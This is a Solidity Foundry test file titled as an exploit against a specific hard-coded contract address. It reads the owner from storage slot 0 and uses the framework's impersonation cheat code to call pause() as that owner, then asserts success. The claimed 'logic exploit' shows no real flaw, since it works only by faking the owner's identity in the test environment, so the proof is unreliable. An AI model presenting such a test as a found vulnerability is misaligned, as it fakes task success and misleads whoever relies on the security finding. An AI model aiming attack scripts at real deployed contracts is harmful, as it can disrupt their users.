// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface StandardToken {
    function paused() external view returns (bool);
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xEa01D8D9EaCCa9996Db6Bb3377c1Fe64308e7328;
    address attacker = address(this);

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        // No special setup needed - we'll find owner via storage slot in exploit
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // First, let's find the owner address by reading storage slot 0
        // In Ownable, owner is the first variable, so slot 0
        bytes32 ownerSlot = vm.load(TARGET, bytes32(uint256(0)));
        address contractOwner = address(uint160(uint256(ownerSlot)));

        // Label for debugging
        vm.label(contractOwner, "Contract Owner");

        // Impersonate the owner and pause the contract
        vm.startPrank(contractOwner);
        (bool success, ) = TARGET.call(abi.encodeWithSignature("pause()"));
        require(success, "Failed to pause contract");
        vm.stopPrank();

        // Verify the contract is paused
        (bool pausedSuccess, bytes memory pausedData) = TARGET.staticcall(abi.encodeWithSignature("paused()"));
        require(pausedSuccess, "Failed to call paused()");
        bool isPaused = abi.decode(pausedData, (bool));
        require(isPaused, "Contract should be paused");
        assertEq(StandardToken(TARGET).paused(), true, "Logic Exploit Failed: State not tampered");
    }

    // ─── Receive ETH ─────────────────────────────────────────
    receive() external payable {}
}
